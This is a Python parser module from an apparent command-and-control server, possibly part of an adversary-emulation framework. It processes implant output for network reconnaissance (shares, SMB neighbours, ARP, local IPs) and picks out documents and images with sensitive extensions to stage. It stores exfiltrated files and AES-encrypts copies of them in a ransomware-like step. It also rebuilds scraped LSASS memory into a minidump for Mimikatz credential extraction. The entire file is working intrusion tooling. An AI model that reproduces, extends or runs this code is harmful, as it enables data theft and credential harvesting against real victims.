import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib
from c2.c2_server import read_c2_log, ConnectionStorage
from c2.c2_facts import FactsStorage
import c2.makeminidump
import re


def null_parser(conn_uuid, cmd_indexes_list):
    return []


def net_view_parser(conn_uuid, cmd_indexes_list):
    shares = []
    ip_pat = re.compile(r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
    share_name_pat = re.compile(r'([^\s]+[\s]?[^\s]+)+')
    target_ip = ""
    for index in cmd_indexes_list:
        data = read_c2_log(conn_uuid, index)
        cmd = data
        data = data.split('\n')
        if cmd.startswith('usermode'):
            try:
                target_ip = re.findall(ip_pat, cmd)[0]
            except IndexError:
                if 'localhost' in cmd:
                    target_ip = 'localhost'
                else:
                    target_ip = f"Error parsing IP from {cmd}"
            continue
        elif 'error' in "\n".join(data).lower():
            continue
        data = data[1:]
        shares_to_parse = data[7:-3]
        for share in shares_to_parse:
            try:
                share_name = re.findall(share_name_pat, share)[0]
                shares.append(target_ip + '\\' + share_name)
            except IndexError:
                pass
    return [('shares', shares)]


def nbtstat_parser(conn_uuid, cmd_indexes_list):
    smb_neighbors = []
    ip_pat = re.compile(r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
    target_ip = ''
    for index in cmd_indexes_list:
        data = read_c2_log(conn_uuid, index)
        # cmd = data.split('\n')[0]
        cmd = data      # there is the raw shellcode, which contains newlines
        if cmd.startswith('usermode'):
            try:
                target_ip = re.findall(ip_pat, cmd)[0]
            except IndexError:
                if 'nbtstat -n' in cmd:
                    target_ip = 'localhost'
                else:
                    target_ip = f"Error parsing IP from {cmd}"
            continue
        if '<20>' in data:
            smb_neighbors.append(target_ip)
    return [('smb_neighbors', smb_neighbors)]


def ipconfig_parser(conn_uuid, cmd_indexes_list):
    index = cmd_indexes_list[-1]
    data = read_c2_log(conn_uuid, index)
    local_ip_addr = ''
    local_ip_pat = re.compile(r'IPv4[^\d]+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
    only_ip = re.compile(r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
    try:
        local_ip = re.findall(local_ip_pat, data)[0]
        local_ip_addr = re.findall(only_ip, local_ip)[0]
    except IndexError:
        pass
    return [('local_ip_addr', local_ip_addr)]


def arp_cache_parser(conn_uuid, cmd_indexes_list):
    index = cmd_indexes_list[-1]
    data = read_c2_log(conn_uuid, index)
    entry_pat = re.compile(r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\s+[0-9a-f\-]{17}')
    sep_pat = re.compile(r'\s+')
    entries = re.findall(entry_pat, data)
    arp_entries = [re.sub(sep_pat, '@', entry) for entry in entries]
    return [('arp_entries', arp_entries)]


def local_users_parser(conn_uuid, cmd_indexes_list):
    index = cmd_indexes_list[0]
    data = read_c2_log(conn_uuid, index).split('\n')[1:]
    not_local_users = ['directory opened, sending files', '.', '..', 'All Users', 'Default',
                       'Default User', 'desktop.ini', 'Public', 'directory listing finished', '',
                       'error with specified directory', 'error while querying opened dir']
    local_users = []
    for line in data:
        line = line.replace('\x00', '')
        if line not in not_local_users:
            local_users.append(line)
    if len(local_users) == 0:
        return [('local_users', local_users)]
    else:
        # a default target local user, can be overwritten
        return [('local_users', local_users),
                ('target_local_user', local_users[0])]


def generic_dir_parser(conn_uuid, cmd_indexes_list):
    target = []
    for index in cmd_indexes_list:
        data = read_c2_log(conn_uuid, index).split('\n')
        base_dir = data[0].split(" ")[1].strip()
        if not base_dir.endswith('\\'):
            base_dir += '\\'
        data = data[1:]
        excluded = ['directory opened, sending files', '.', '..', 'directory listing finished', '',
                    'desktop.ini', 'error with specified directory', 'error while querying opened dir']
        for line in data:
            line = line.replace('\x00', '')
            if line not in excluded:
                target.append(base_dir + line)
    if len(target) == 0:
        return [('staged_files', target)]
    else:
        # a default target file, can be overwritten
        return [('staged_files', target),
                ('target_file', target[0])]


def sensitive_files_dir_parser(conn_uuid, cmd_indexes_list):
    sensitive_files = []
    sensitive_extensions = (".doc", ".docx", ".pdf", ".jpg", ".jpeg", ".png", ".mp4", ".txt", ".pptx", ".zip", ".7z")
    for index in cmd_indexes_list:
        data = read_c2_log(conn_uuid, index).split('\n')
        base_dir = data[0].split(" ")[1].strip()
        data = data[1:]
        for line in data:
            line = line.replace('\x00', '')
            if line.lower().endswith(sensitive_extensions):
                sensitive_files.append(base_dir + line)
    return [('staged_files', sensitive_files)]


def generic_file_parser(conn_uuid, cmd_indexes_list):
    exfiltrated_files = []
    for index in cmd_indexes_list:
        data = read_c2_log(conn_uuid, index, decode=False).split(b'\n')
        cmd, file_data = data[0], b"\n".join(data[1:])
        cmd = cmd.decode()
        full_path = cmd.split(" ")[1]
        exfil_filename = full_path.replace("\\", "_")
        exfiltrated_files.append(exfil_filename)
        with open(os.path.join('/usr/src/app/c2/connections', conn_uuid, exfil_filename), 'wb') as f:
            f.write(file_data)
    return [('exfiltrated_files', exfiltrated_files)]


def file_parsing_and_encryption(conn_uuid, cmd_indexes_list):
    exfiltrated_files = []
    for index in cmd_indexes_list:
        data = read_c2_log(conn_uuid, index, decode=False).split(b'\n')
        cmd, file_data = data[0], b"\n".join(data[1:])
        cmd = cmd.decode()
        full_path = cmd.split(" ")[1]
        exfil_filename = full_path.replace("\\", "_")
        exfiltrated_files.append(exfil_filename)
        with open(os.path.join('/usr/src/app/c2/connections', conn_uuid, exfil_filename), 'wb') as f:
            f.write(file_data)
        exfil_filename_enc = exfil_filename + '.enc'
        md5 = hashlib.md5()
        md5.update(conn_uuid.encode())
        md5.update(exfil_filename_enc.encode())
        aes_key = md5.digest()
        cipher = AES.new(aes_key, AES.MODE_CBC)
        enc_file_data = cipher.encrypt(pad(file_data, AES.block_size))
        enc_file_data = cipher.iv + enc_file_data
        with open(os.path.join('/usr/src/app/c2/connections', conn_uuid, exfil_filename_enc), 'wb') as f:
            f.write(enc_file_data)
    return [('exfiltrated_files', exfiltrated_files)]


def version_parser(conn_uuid, cmd_indexes_list):
    index = cmd_indexes_list[0]
    data = read_c2_log(conn_uuid, index, decode=False)
    data = data[-276:]
    dwMajorVersion = int.from_bytes(data[4:7], byteorder='little')
    dwMinorVersion = int.from_bytes(data[8:11], byteorder='little')
    dwBuildNumber = int.from_bytes(data[12:15], byteorder='little')
    return [
        ('major_version', dwMajorVersion),
        ('minor_version', dwMinorVersion),
        ('build_number', dwBuildNumber)
    ]


def process_dump_parser_to_minidump(conn_uuid, cmd_indexes_list):
    # note: this parser requires major_version, minor_version and build_number as facts
    index = cmd_indexes_list[0]
    data = read_c2_log(conn_uuid, index, decode=False)
    data = b'\n'.join(data.split(b'\n')[2:])
    connectionStorage = ConnectionStorage()
    facts = FactsStorage(connectionStorage, conn_uuid)
    dwMajorVersion, dwMinorVersion, dwBuildNumber = \
        facts.getFact('major_version'), facts.getFact('minor_version'), facts.getFact('build_number')
    regions, modules = [], []
    while len(data) > 0:
        header, data = data[:16], data[16:]
        scrape_type = int.from_bytes(header[0:3], byteorder='little')
        size = int.from_bytes(header[4:7], byteorder='little')
        region = int.from_bytes(header[8:15], byteorder='little')
        if scrape_type == 1:
            reg_data, data = data[:size], data[size:]
            regions.append((region, reg_data))
        elif scrape_type == 0:
            module_data, data = data[:100], data[100:]
            module_data = b"\\\x00" + module_data  # Mimikatz wcsrchr
            modules.append((region, size, module_data))
    c2.makeminidump.makeminidump(
        os.path.join('/usr/src/app/c2/connections', conn_uuid, "lsass.dmp"),
        dwMajorVersion,
        dwMinorVersion,
        dwBuildNumber,
        regions,
        modules
    )
    return []
